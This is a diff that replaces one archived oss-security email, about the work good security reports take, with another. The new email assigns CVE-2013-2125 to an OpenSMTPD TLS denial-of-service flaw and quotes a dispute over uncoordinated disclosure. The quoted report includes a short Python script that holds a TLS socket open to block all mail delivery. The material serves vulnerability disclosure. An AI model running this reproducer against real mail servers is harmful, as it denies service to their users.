@@ -1,47 +1,98 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/02/27/41
-Message-ID: <512E6279.3050003@fifthhorseman.net>
-Date: Wed, 27 Feb 2013 11:46:01 -0800
-From: Daniel Kahn Gillmor <dkg@...thhorseman.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/18/12
+Message-ID: <5197EADD.3070004@redhat.com>
+Date: Sat, 18 May 2013 14:55:57 -0600
+From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-CC: "Jason A. Donenfeld" <Jason@...c4.com>
-Subject: Re: CVE request - Linux kernel: VFAT slab-based buffer overflow
+CC: Gilles Chehade <gilles@...lp.org>, "Jason A. Donenfeld" <Jason@...c4.com>, misc@...nsmtpd.org
+Subject: Re: Re: CVE Request: DoS in OpenSMTPD TLS Support
 Content-Type: text/plain; charset=utf-8
 
-On 02/27/2013 11:26 AM, Jason A. Donenfeld wrote:
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-> "If you see something, say something."
+On 05/18/2013 10:16 AM, Gilles Chehade wrote:
+> Erf...
+> 
+> Not too nice to send a CVE request without ANY coordination with us
+> ...
+> 
+> Just for the record, you contacted us today reporting a bug which
+> could be memory corruption and you didn't know if it could be
+> exploited. Then I replied telling you that we discovered and fixed
+> the bug two days ago and I then explained to you what the bug
+> really was (wrong logic in the IO events handling code in our SSL
+> layer). I then told you that we made snapshots with the fix applied
+> AND that we has planned for a release on *Monday* with the fixes
+> backported.
+> 
+> The snapshot mail, commit log and diffs makes the issue obvious, I
+> just don't understand why you had to go and publish *RIGHT AWAY* a
+> script on public lists after our mail exchange...
+> 
+> I'm not mad that you disclosed a bug, we're very open about it, and
+> the git history is full of references to crash and security fixes,
+> but it's just REALLY not nice how you handled this and are forcing
+> me to do this release in a hurry rather than handling it with
+> package maintainers.
+> 
+> Next time, please coordinate a little, just to be nice.
+> 
+> 
+> On Sat, May 18, 2013 at 04:27:22PM +0200, Jason A. Donenfeld
+> wrote:
+>> Hi Kurt,
+>> 
+>> The SSL handling in the latest OpenSMTPD (5.3.1) misconfigures
+>> its sockets in blocking mode, allowing an attacker to prevent all
+>> mail delivery simply by holding a socket open.
+>> 
+>> I discovered this accidentally, as I noticed my HP printer's
+>> smtp client would keep the connection indefinitely open after an 
+>> unsuccessful authentication attempt, causing no more mail to be 
+>> delivered until I SIGKILL'd my smtpd process or unplugged my
+>> printer.
+>> 
+>> The following reproduces the attack trivially:
+>> 
+>> #!/usr/bin/env python2 import smtplib import time print "[+]
+>> Connecting to server and initiating TLS" smtp =
+>> smtplib.SMTP("mail.some-vitim-host.blah", 587) smtp.starttls() 
+>> print "[+] No clients will be able to connect as long as this
+>> remains open." time.sleep(100000000)
+>> 
+>> Apparently this was fixed recently upstream, noting "evil client"
+>> in the commit message: 
+>> http://git.zx2c4.com/OpenSMTPD/commit/?id=38b26921bad5fe24ad747bf9d591330d683728b0
+>>
+>>
+>> 
+A snapshot has been posted to http://www.opensmtpd.org/archives/ , but
+>> no patch release has yet been made.
+>> 
+>> Jason
 
-I'd love it if it were this simple, but it's not.  It's work.  Look at
-the examples of good security reports on this list (e.g. ones that were
-issued CVEs with no extra discussion needed).
-
-These reports require thoughtful analysis, testing, and a good sense of
-what the tradeoffs are for making the fixes.  this takes time (and
-skill).  Sometimes all the work and analysis leads to a conclusion that
-the failure was not actually exploitable in any significant way.  And
-not every fix has obvious security implications -- some only become
-apparent after the investigative work is done.
-
-Some fixes are simple, fixing them has no obvious side effects, and
-there is clear evidence not fixing it could lead to an exploit.  You
-could even argue that the issue that started this thread is one of them
-(though i haven't spent enough time to understand it well enough to know
-if that's the case).
-
-If *every* bug fix were reported to oss-security without this work, as
-something like "i'm not sure, but this might be security-related", then
-this list would drown in noise (the NYC MTA's supposed anti-terrorism
-campaign suffers this same flaw, btw).
-
-So, we have a culture of asking people to report security flaws only
-after doing some level of work to ensure that the report is correct and
-understood.
-
-We have to acknowledge that this is extra work, and not everyone has the
-time (or skill) to do it properly.
-
-	--dkg
+Please use CVE-2013-2125 for this issue.
 
 
-Download attachment "signature.asc" of type "application/pgp-signature" (1028 bytes)
+
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.13 (GNU/Linux)
+
+iQIcBAEBAgAGBQJRl+rdAAoJEBYNRVNeJnmT/qQP/0/CZGz8BVlVcwB4mubepywJ
+L94gzRPt5fbVr3a9gbXbV8tv5lAmYIHemH5KSp3fJF8e3OSPVATGNUnovgNFceFv
+naAhAca3lhtXlOepgGdEoC/AjMwIYdxBhgH8/GtfEv5UdOWpOno2Yqf1Mk4nSduN
+MuKJ1hOCoSELUEvkAC5eSNF+lwv3AaD8TZeWyRWlU8uzRXi1G+cD7z+3cKIP8I8u
+wJze/qSiNmdkRRABB4L7wi7lCPxNO40ZRyZe5HOus6l3no4IUycn3i28xEawvOGX
+wwChCpVmiysCxZZMRtFSrvx4FqiopbHgdlKyFP8S7TWEwslfvjvuFE2d716iSacs
+M46lG4RU4BrBENFvZHMHrgOKcmVEpoFpICQoFrfjXpcMQSTNtrnyK/oJyboCPkSo
+EXQCVz1V0lJ8lwUAmsEXp+l/TFxzNGlDeQe5pvpo6bSBIv/xHYhaz66lo1D6kfUN
+Rol0zr2nkLjIDemD+aeaZ2IeuaXkZ3mgAK+TdIHgglwNiUCYZKuuad0T7wBcoEaz
+Rnqiudnk5LXl03XqZfUB1zTG4Mp8F90L5x962oQ8fHKqIAPUdDHXJer4+XPF13iw
+blzr5AxapPh/DlQUH7HOdEs83y05VaBAI7/HW5Ma8oUpmo9RhlWmYpJth5hq/RcQ
+TxYSatIJAOoUeGUPcALn
+=9aga
+-----END PGP SIGNATURE-----
